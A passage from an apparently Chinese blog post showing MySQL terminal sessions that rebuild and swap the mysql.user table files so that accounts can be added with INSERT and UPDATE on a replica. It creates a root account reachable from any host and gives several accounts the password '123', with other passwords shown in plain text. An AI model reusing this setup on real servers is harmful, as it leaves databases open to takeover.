title="步骤概览"></a>步骤概览</h3><ol><li>创建新的user_1表</li><li>对user_1表添加新的用户</li><li>停服务</li><li>将user_1替换user表</li><li>启动该服务</li><li>可以通过update、insert、delete操作user表来添加权限（grant无法操作）</li></ol><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line">root@MySQL-01 10:35:  [mysql]&gt; create table user_1 like user;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select * from user_1;</span><br><span class="line">Empty set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like user;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'user' at line 1</span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like 'user_1';</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| Name   | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time         | Update_time         | Check_time | Collation | Checksum | Create_options | Comment                     |</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| user_1 | MyISAM |      10 | Dynamic    |    0 |              0 |           0 | 281474976710655 |         1024 |         0 |           NULL | 2019-01-04 10:36:00 | 2019-01-04 10:36:00 | NULL       | utf8_bin  |     NULL |                | Users and global privileges |</span><br><span class="line">+--------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; show table status like 'user';</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| Name | Engine | Version | Row_format | Rows | Avg_row_length | Data_length | Max_data_length | Index_length | Data_free | Auto_increment | Create_time         | Update_time         | Check_time          | Collation | Checksum | Create_options | Comment                     |</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">| user | MyISAM |      10 | Dynamic    |    3 |             53 |         160 | 281474976710655 |         2048 |         0 |           NULL | 2015-05-22 15:24:42 | 2019-01-04 09:27:49 | 2015-05-22 15:33:22 | utf8_bin  |     NULL |                | Users and global privileges |</span><br><span class="line">+------+--------+---------+------------+------+----------------+-------------+-----------------+--------------+-----------+----------------+---------------------+---------------------+---------------------+-----------+----------+----------------+-----------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; insert into user_1 select * from user;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select * from user_1;</span><br><span class="linespan><br><span class="line">| Host      | User | Password | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |</span><br><span class="linespan><br><span class="line">| localhost | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">| 127.0.0.1 | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="line">| ::1       | root |          | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |</span><br><span class="linespan><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; select user,host,authentication_string from user_1;</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">| user | host      | authentication_string |</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">| root | localhost |                       |</span><br><span class="line">| root | 127.0.0.1 |                       |</span><br><span class="line">| root | ::1       |                       |</span><br><span class="line">+------+-----------+-----------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:36:  [mysql]&gt; update user_1 set authentication_string=password('(Uploo00king)') where user='root';</span><br><span class="line">Query OK, 3 rows affected, 1 warning (0.01 sec)</span><br><span class="line">Rows matched: 3  Changed: 3  Warnings: 1</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:37:  [mysql]&gt; select user,host,authentication_string from user_1;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:37:  [mysql]&gt; exit</span><br><span class="line">Bye</span><br><span class="line">[root@sh_02 data]# /etc/init.d/mysqld stop</span><br><span class="line">Shutting down MySQL..                                      [  OK  ]</span><br><span class="line">[root@sh_02 mysql]# ll user_1*</span><br><span class="line">-rw-r-----. 1 mysql mysql 10630 Jan  4 10:36 user_1.frm</span><br><span class="line">-rw-r-----. 1 mysql mysql   328 Jan  4 10:37 user_1.MYD</span><br><span class="line">-rw-r-----. 1 mysql mysql  2048 Jan  4 10:37 user_1.MYI</span><br><span class="line">[root@sh_02 mysql]# mv user_1.frm user.frm</span><br><span class="line">[root@sh_02 mysql]# mv user_1.MYD user.MYD</span><br><span class="line">[root@sh_02 mysql]# mv user_1.MYI user.MYI</span><br><span class="line">[root@sh_02 mysql]# ll user*</span><br><span class="line">-rw-r-----. 1 mysql mysql 10630 Jan  4 10:36 user.frm</span><br><span class="line">-rw-r-----. 1 mysql mysql   328 Jan  4 10:37 user.MYD</span><br><span class="line">-rw-r-----. 1 mysql mysql  2048 Jan  4 10:37 user.MYI</span><br><span class="line">-rw-rw----. 1 mysql mysql  3989 Aug 14 09:14 user_view.frm</span><br><span class="line">[root@sh_02 mysql]# /etc/init.d/mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@sh_02 mysql]# mysql -uroot -p'(Uploo00king)'</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 6</span><br><span class="line">Server version: 5.7.20-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| db1                |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">root@MySQL-01 10:39:  [mysql]&gt; select user,host from mysql.user;</span><br><span class="line">+------+-----------+</span><br><span class="line">| user | host      |</span><br><span class="line">+------+-----------+</span><br><span class="line">| root | 127.0.0.1 |</span><br><span class="line">| root | ::1       |</span><br><span class="line">| root | localhost |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [mysql]&gt; grant all on *.* to booboo@'%' identified by '(Uploo00king)';</span><br><span class="line">ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 11:39:  [mysql]&gt; update mysql.user_1 set user='aliyun_root' where host='127.0.0.1';</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 11:40:  [mysql]&gt; select user,host from mysql.user_1;</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| user        | host      |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| aliyun_root | 127.0.0.1 |</span><br><span class="line">| root        | ::1       |</span><br><span class="line">| root        | localhost |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">aliyun_root@MySQL-01 11:51:  [mysql]&gt; insert into mysql.user values ('%','jowing', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('Joowing@2017'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">aliyun_root@MySQL-01 11:51:  [mysql]&gt; select user,host from  mysql.user;</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| user        | host      |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| jowing      | %         |</span><br><span class="line">| aliyun_root | 127.0.0.1 |</span><br><span class="line">| root        | ::1       |</span><br><span class="line">| root        | localhost |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="生产环境"><a href="#生产环境" class="headerlink" title="生产环境"></a>生产环境</h3><h4 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h4><p>目标：IDC机房从库支持通过insert、update、delete命令来修改用户权限，权限比较简单，分为只读和写。</p><p>需要设置以下权限：权限作用于所有的库多有的表</p><table><thead><tr><th align="left">用户名</th><th align="left">密码</th><th align="left">权限</th></tr></thead><tbody><tr><td align="left">root</td><td align="left">123</td><td align="left">读写</td></tr><tr><td align="left">joowingbuz</td><td align="left">123</td><td align="left">只读</td></tr><tr><td align="left">ottersync</td><td align="left">123</td><td align="left">只读</td></tr><tr><td align="left">syncdw</td><td align="left">123</td><td align="left">只读</td></tr><tr><td align="left">datasis</td><td align="left">123</td><td align="left">只读</td></tr><tr><td align="left">joowingv</td><td align="left">123</td><td align="left">只读</td></tr><tr><td align="left">datadev</td><td align="left">123</td><td align="left">只读</td></tr><tr><td align="left">readonly</td><td align="left">123</td><td align="left">只读</td></tr></tbody></table><h4 id="步骤概览-1"><a href="#步骤概览-1" class="headerlink" title="步骤概览"></a>步骤概览</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 登陆数据库后操作如下：</span></span><br><span class="line">use mysql;</span><br><span class="line">create table user_1 like user;</span><br><span class="line">insert into user_1 select * from user;</span><br><span class="line">delete from mysql.user_1 where user='root';</span><br><span class="line">insert into mysql.user_1 values ('%','root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','joowingbuz', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','ottersync', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','syncdw', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','datasis', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','joowingv', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','datadev', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','readonly', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 退出数据库并停止服务</span></span><br><span class="line">/data/mysql/support-files/mysql.server stop</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 将user_1表的物理文件覆盖user表</span></span><br><span class="line">cd /data/xtrabackup_data/mysql/</span><br><span class="line">mv user.frm user.ibd user.MYD user.MYI user.TRG /tmp</span><br><span class="line">mv user_1.frm user.frm</span><br><span class="line">mv user_1.MYI user.MYI</span><br><span class="line">mv user_1.MYD user.MYD</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 启动数据库</span></span><br><span class="line">/data/mysql/support-files/mysql.server start</span><br></pre></td></tr></table></figure><h4 id="操作明细"><a href="#操作明细" class="headerlink" title="操作明细"></a>操作明细</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><span class="line">root@MySQL-01 15:42:  [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; create table user_1 like user;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; insert into user_1 select * from user;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; select user,host,authentication_string from mysql.user;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; select user,host,authentication_string from mysql.user_1;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; desc mysql.user_1;</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">| Field                  | Type                              | Null | Key | Default | Extra |</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">| Host                   | char(60)                          | NO   | PRI |         |       |</span><br><span class="line">| User                   | char(16)                          | NO   | PRI |         |       |</span><br><span class="line">| Password               | char(41)                          | NO   |     |         |       |</span><br><span class="line">| Select_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Insert_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Update_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Delete_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Drop_priv              | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Reload_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Shutdown_priv          | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Process_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| File_priv              | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Grant_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| References_priv        | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Index_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Alter_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Show_db_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Super_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_tmp_table_priv  | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Lock_tables_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Execute_priv           | 